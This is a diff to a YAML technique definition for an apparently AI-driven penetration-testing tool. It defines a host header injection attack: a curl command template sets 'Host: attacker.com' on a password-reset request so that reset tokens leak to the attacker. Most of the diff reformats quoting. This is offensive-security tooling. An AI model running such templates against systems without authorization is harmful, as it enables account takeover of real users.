@@ -2,15 +2,18 @@ name: host_header_attack
 category: web
 description: Host header injection for password reset poisoning
 preconditions:
-  - service.port==80
+- service.port==80
 parameters:
   target_ip: from_engagement.target_ip
-command_template: "curl -s '{target_url}/reset-password' -H 'Host: attacker.com' -d 'email=victim@target.com'"
+command_template: 'curl -s ''{target_url}/reset-password'' -H ''Host: attacker.com''
+  -d ''email=victim@target.com'''
 parser: null
 expected_effects:
-  - action_completed
+- action_completed
 falsifier:
-  pattern: "error|failed|refused|denied"
+  pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: "If app uses Host header to build reset links, inject attacker domain. Victim clicks link → token sent to attacker. Also: routing-based SSRF via Host header."
+mechanism: 'If app uses Host header to build reset links, inject attacker domain.
+  Victim clicks link → token sent to attacker. Also: routing-based SSRF via Host header.'
+hacktricks_ref: network-services-pentesting/pentesting-web/uncovering-cloudflare.md
